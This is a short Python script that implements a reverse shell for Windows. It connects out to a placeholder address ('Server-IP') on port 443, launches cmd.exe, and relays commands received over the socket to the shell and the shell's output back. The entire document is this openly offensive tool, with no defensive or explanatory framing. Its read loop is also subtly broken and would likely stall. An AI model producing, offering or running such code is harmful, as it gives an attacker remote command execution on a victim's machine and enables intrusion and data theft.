import socket
import subprocess

def start_reverse_shell(ip_address, port):
    try:
        # Create a socket object
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # Connect to the specified IP address and port
        s.connect((ip_address, port))
        print("Connected to", ip_address, "on port", port)

        # Start a new shell process
        shell = subprocess.Popen(["cmd.exe"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)

        # Forward data between the socket and the shell process
        while True:
            # Read data from the socket
            data = s.recv(1024)
            if not data:
                break
            
            # Write data to the shell process's stdin
            shell.stdin.write(data)
            shell.stdin.flush()

            # Read output from the shell process's stdout and send it back to the socket
            output = shell.stdout.read()
            s.sendall(output)

        # Close the socket and terminate the shell process
        s.close()
        shell.terminate()

    except Exception as e:
        print("Error:", e)

# Specify the target IP address and port
target_ip_address = "Server-IP"
target_port = 443

# Start the reverse shell
start_reverse_shell(target_ip_address, target_port)
